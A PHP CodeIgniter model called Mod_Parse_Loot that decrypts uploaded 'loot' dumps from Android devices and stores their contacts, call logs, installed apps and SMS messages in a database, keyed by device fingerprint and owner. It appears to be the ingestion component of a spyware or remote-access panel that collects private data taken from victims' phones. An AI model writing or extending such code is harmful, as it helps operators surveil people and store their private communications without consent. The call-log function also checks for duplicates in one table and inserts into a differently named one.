<?php

namespace App\Models;

use CodeIgniter\Model;

class Mod_Parse_Loot extends Model
{
    /**
     * Parses and inserts contacts from modern JSON file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @return bool
     */
    public function get_contacts(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decode_content($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $json = json_decode($loot_decoded, true);
            if ($json === null || !isset($json['contacts']) || !is_array($json['contacts'])) {
                log_message('error', 'Invalid JSON structure in contacts file: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;

            $batchData = [];
            foreach ($json['contacts'] as $contact) {
                if (!isset($contact['id']) || !isset($contact['display_name'])) {
                    continue; // Skip invalid entries
                }

                $data = [
                    'contact_id'         => $contact['id'],
                    'display_name'       => $contact['display_name'],
                    'phone_numbers'      => !empty($contact['phone_numbers']) ? json_encode($contact['phone_numbers']) : null,
                    'phone_count'        => $contact['phone_count'] ?? count($contact['phone_numbers'] ?? []),
                    'emails'             => !empty($contact['emails']) ? json_encode($contact['emails']) : null,
                    'email_count'        => $contact['email_count'] ?? count($contact['emails'] ?? []),
                    'photo_uri'          => $contact['photo_uri'] ?? null,
                    'companies'          => !empty($contact['companies']) ? json_encode($contact['companies']) : null,
                    'addresses'          => !empty($contact['addresses']) ? json_encode($contact['addresses']) : null,
                    'notes'              => $contact['notes'] ?? null,
                    'is_favorite'        => $contact['is_favorite'] ? 1 : 0,
                    'last_contacted'     => $contact['last_time_contacted'] ?? null,
                    'contact_frequency'  => $contact['times_contacted'] ?? 0,
                    'device_id'          => $var_file_print, // Using print as device fingerprint
                    'extracted_at'       => $extracted_at,
                    'meta_Owner'         => $var_file_owner,
                    'is_synced'          => 0,
                    'sync_count'         => 0,
                    'is_active'          => 1,
                    'created_at'         => $dated,
                    'updated_at'         => $dated,
                ];

                // Duplicate check using unique constraint fields
                $exists = $this->db->table('tbl_contacts')
                        ->where('contact_id', $data['contact_id'])
                        ->where('device_id', $data['device_id'])
                        ->where('meta_Owner', $data['meta_Owner'])
                        ->countAllResults() > 0;

                if (!$exists) {
                    $batchData[] = $data;
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_contacts')->insertBatch($batchData);
                log_message('info', 'Batch inserted ' . count($batchData) . ' contacts from ' . $file_name);
            }

            return true;
        } catch (\Exception $e) {
            log_message('error', 'get_contacts parse error for ' . $file_name . ': ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Parses and inserts call logs from modern JSON file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @return bool
     */
    public function get_logs(string $file_name, int $var_file_owner, string $var_file_print): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decode_content($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $json = json_decode($loot_decoded, true);
            if ($json === null || !isset($json['call_logs']) || !is_array($json['call_logs'])) {
                log_message('error', 'Invalid JSON structure in call logs file: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;

            $batchData = [];
            foreach ($json['call_logs'] as $log) {
                if (!isset($log['phone_number']) || !isset($log['call_date'])) {
                    continue; // Skip invalid
                }

                $call_date = date('Y-m-d H:i:s', substr($log['call_date'], 0, -3)); // Convert ms to seconds

                $logData = [
                    'contact_name'       => $log['contact_name'] ?? null,
                    'phone_number'       => $log['phone_number'],
                    'call_type'          => $log['call_type'] ?? 'Unknown',
                    'call_date'          => $call_date,
                    'duration_seconds'   => $log['duration_seconds'] ?? 0,
                    'formatted_duration' => $log['formatted_duration'] ?? '',
                    'device_id'          => $var_file_print,
                    'extracted_at'       => $extracted_at ? date('Y-m-d H:i:s', substr($extracted_at, 0, -3)) : null,
                    'meta_Owner'         => $var_file_owner,
                    'is_active'          => 1,
                    'created_at'         => $dated,
                    'updated_at'         => $dated,
                ];

                // Strong duplicate prevention: same number, exact timestamp, duration, and type
                $exists = $this->db->table('tbl_call_logs')
                        ->where('phone_number', $logData['phone_number'])
                        ->where('call_date', $logData['call_date'])
                        ->where('duration_seconds', $logData['duration_seconds'])
                        ->where('meta_Owner', $logData['meta_Owner'])
                        ->countAllResults() > 0;

                if (!$exists) {
                    $batchData[] = $logData;
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_CallLogs')->insertBatch($batchData);
                log_message('info', 'Batch inserted ' . count($batchData) . ' call logs from ' . $file_name);
            }

            return true;
        } catch (\Exception $e) {
            log_message('error', 'get_logs parse error for ' . $file_name . ': ' . $e->getMessage());
            return false;
        }
    }
    /**
     * Parses and inserts apps from modern JSON file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @return bool
     */
    public function get_apps(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decode_content($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $json = json_decode($loot_decoded, true);
            if ($json === null || !isset($json['installed_apps']) || !is_array($json['installed_apps'])) {
                log_message('error', 'Invalid JSON structure in apps file: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;
            $device_id = $json['device_id'] ?? $var_file_print;
            $device_model = $json['device_model'] ?? null;
            $android_version = $json['android_version'] ?? null;

            $batchData = [];
            foreach ($json['installed_apps'] as $app) {
                if (!isset($app['package_name']) || !isset($app['app_name'])) {
                    continue; // Skip invalid entries
                }

                $data = [
                    'package_name'       => $app['package_name'],
                    'app_name'           => $app['app_name'],
                    'version_name'       => $app['version_name'] ?? null,
                    'version_code'       => $app['version_code'] ?? null,
                    'first_install_time' => $app['first_install_time'] ?? null,
                    'last_update_time'   => $app['last_update_time'] ?? null,
                    'is_system_app'      => $app['is_system_app'] ? 1 : 0,
                    'target_sdk'         => $app['target_sdk'] ?? null,
                    'min_sdk'            => $app['min_sdk'] ?? null,
                    'permissions'        => !empty($app['permissions']) ? json_encode($app['permissions']) : null,
                    'permission_count'   => $app['permission_count'] ?? 0,
                    'app_size'           => $app['app_size'] ?? 0,
                    'device_id'          => $device_id,
                    'device_model'       => $device_model,
                    'android_version'    => $android_version,
                    'meta_owner'         => $app['meta_owner'] ?? $var_file_owner,
                    'extracted_at'       => $extracted_at,
                    'meta_print'         => $var_file_print,
                    'created_at'         => $dated,
                    'updated_at'         => $dated,
                ];

                // Duplicate check: same package on same device
                $exists = $this->db->table('tbl_apps')
                        ->where('package_name', $data['package_name'])
                        ->where('device_id', $data['device_id'])
                        ->countAllResults() > 0;

                if (!$exists) {
                    $batchData[] = $data;
                } else {
                    // Update existing app info
                    $this->db->table('tbl_apps')
                        ->where('package_name', $data['package_name'])
                        ->where('device_id', $data['device_id'])
                        ->update([
                            'app_name'         => $data['app_name'],
                            'version_name'     => $data['version_name'],
                            'version_code'     => $data['version_code'],
                            'last_update_time' => $data['last_update_time'],
                            'permissions'      => $data['permissions'],
                            'permission_count' => $data['permission_count'],
                            'app_size'         => $data['app_size'],
                            'extracted_at'     => $data['extracted_at'],
                            'updated_at'       => $dated,
                        ]);
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_apps')->insertBatch($batchData);
                log_message('info', 'Batch inserted ' . count($batchData) . ' apps from ' . $file_name);
            }

            return true;
        } catch (\Exception $e) {
            log_message('error', 'get_apps parse error for ' . $file_name . ': ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Parses and inserts SMS from file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @return bool
     */
    public function get_sms(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null): bool
    {
        try {
            $cryptModel   = new Mod_Crypt();
            $androidModel = new Mod_Android(); // Fixed: was AndroidModel()
            $dated        = date('Y-m-d H:i:s');

            /* ---------------------------------------------------------
             * Read encrypted dump file
             * --------------------------------------------------------- */
            $filePath = WRITEPATH . 'uploads/text_dump/' . $file_name;
            $rawData  = file_get_contents($filePath);

            if ($rawData === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            /* ---------------------------------------------------------
             * Decode encrypted content
             * --------------------------------------------------------- */
            $decoded = $cryptModel->decode_content($rawData);
            if ($decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            /* ---------------------------------------------------------
             * Decode JSON (NEW FORMAT)
             * --------------------------------------------------------- */
            $json = json_decode($decoded, true);
            if (!isset($json['sms']) || !is_array($json['sms'])) {
                log_message('error', 'Invalid SMS JSON structure: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;
            $smsList      = $json['sms'];
            $batchSize    = 500; // Safe batch size
            $batch        = [];

            /* ---------------------------------------------------------
             * Loop until ALL SMS are processed
             * --------------------------------------------------------- */
            foreach ($smsList as $sms) {

                if (empty($sms['address']) || empty($sms['date'])) {
                    continue; // Skip invalid rows
                }

                // Decode Base64 body
                $smsBody = '';
                $bodyEncoded = '';
                if (!empty($sms['body'])) {
                    $bodyEncoded = $sms['body']; // Store original base64
                    $smsBody = base64_decode($sms['body'], true) ?: '';
                }

                // Convert timestamps (keep as BIGINT for precision)
                $smsTime = $sms['date']; // Keep as milliseconds
                $dateSent = $sms['date_sent'] ?? null;

                // Calculate timestamp difference
                $timestampDiff = 0;
                if ($dateSent && $dateSent > 0) {
                    $timestampDiff = $smsTime - $dateSent;
                }

                $smsData = [
                    // Basic SMS Info (matching database schema)
                    'android_sms_id'     => $sms['sms_id'] ?? null,
                    'thread_id'          => $sms['thread_id'] ?? null,
                    'address'            => $androidModel
                        ->contacts_trim_number_length($sms['address']),
                    'formatted_address'  => $sms['formatted_address'] ?? null,
                    'sms_type'           => $sms['type'] ?? '',
                    'type_code'          => $sms['type_code'] ?? 0,

                    // Message Content
                    'body'               => $bodyEncoded, // Store base64 encoded body
                    'body_length'        => $sms['body_length'] ?? strlen($smsBody),

                    // Timestamps (store as BIGINT milliseconds)
                    'sms_date'           => $smsTime,
                    'sms_date_sent'      => $dateSent,

                    // Message Status
                    'is_read'            => $sms['is_read'] ?? true,
                    'is_seen'            => $sms['is_seen'] ?? true,
                    'status_code'        => $sms['status_code'] ?? 0,
                    'error_code'         => $sms['error_code'] ?? 0,

                    // Technical Details
                    'protocol'           => $sms['protocol'] ?? 0,
                    'protocol_type'      => $sms['protocol_type'] ?? 'SMS',
                    'service_center'     => $sms['service_center'] ?? null,
                    'subject'            => $sms['subject'] ?? null,
                    'is_locked'          => $sms['is_locked'] ?? false,
                    'creator'            => $sms['creator'] ?? null,

                    // Metadata
                    'meta_owner'         => $var_file_owner,
                    'device_id'          => $var_file_print,
                    'extracted_at'       => $extracted_at,

                    // Timestamps
                    'created_at'         => $dated,
                    'updated_at'         => $dated,
                ];

                /* -----------------------------------------------------
                 * Duplicate check (strong prevention)
                 * ----------------------------------------------------- */
                $exists = $this->db->table('tbl_sms')
                        ->where('android_sms_id', $smsData['android_sms_id'])
                        ->where('device_id', $smsData['device_id'])
                        ->where('meta_owner', $smsData['meta_owner'])
                        ->countAllResults() > 0;

                if (!$exists) {
                    $batch[] = $smsData;
                }

                /* -----------------------------------------------------
                 * Insert batch when limit is reached
                 * ----------------------------------------------------- */
                if (count($batch) >= $batchSize) {
                    $this->db->table('tbl_sms')->insertBatch($batch);
                    $batch = [];
                }
            }

            /* ---------------------------------------------------------
             * Insert remaining rows
             * --------------------------------------------------------- */
            if (!empty($batch)) {
                $this->db->table('tbl_sms')->insertBatch($batch);
            }

            log_message(
                'info',
                'SMS import completed for ' . $file_name . ' (' . count($smsList) . ' records processed)'
            );

            return true;

        } catch (\Throwable $e) {
            log_message(
                'error',
                'get_sms parse error for ' . $file_name . ': ' . $e->getMessage()
            );
            return false;
        }
    }

}